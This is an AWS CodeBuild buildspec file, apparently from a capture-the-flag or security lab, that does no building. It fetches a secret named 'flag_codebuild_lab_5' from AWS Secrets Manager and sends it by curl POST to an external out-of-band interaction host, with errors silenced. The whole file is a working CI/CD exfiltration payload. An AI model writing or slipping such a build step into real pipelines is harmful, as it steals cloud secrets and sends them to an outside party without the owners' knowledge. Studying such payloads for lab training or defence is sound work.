version: 0.2
phases:
  build:
    commands:
      - FLAG=$(aws secretsmanager get-secret-value --region us-east-1 --secret-id flag_codebuild_lab_5 --query SecretString --output text 2>/dev/null || echo "not_accessible")
      - curl -sk -X POST "https://d8debjhljbeds6jikmrg6sdyphnt5cdjk.oast.fun/lab5" --data-binary "flag=${FLAG}" || true